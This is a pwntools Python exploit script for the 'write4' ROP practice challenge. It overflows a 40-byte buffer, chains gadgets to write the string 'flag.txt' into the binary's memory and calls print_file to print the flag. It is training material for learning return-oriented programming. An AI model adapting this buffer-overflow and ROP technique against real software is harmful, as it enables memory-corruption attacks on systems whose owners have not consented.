from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"


binary_name = "write4"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)


context.binary = e


def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    elif(sys.argv[1] == "gdb"):
        p = gdb.debug(f"./{binary_name}", gdbscript="b *0x4008F1", aslr=False)
    else:
        p = process(f"./{binary_name}")

    # Functions
    ret = p64(0x4004e6)
    print_file = e.plt['print_file']
    pop_r14_r15 = p64(0x400690)
    arb_write = p64(e.sym['usefulGadgets'])
    pop_rdi = p64(0x400693)

    write_addr = p64(0x601029)

    payload = b"A" *40
    payload+= ret+ pop_r14_r15+ write_addr+ b"flag.txt"+ arb_write  # write 

    payload+= pop_rdi + write_addr 

    payload+=p64(print_file)

    p.sendline(payload)
    p.interactive()

main()
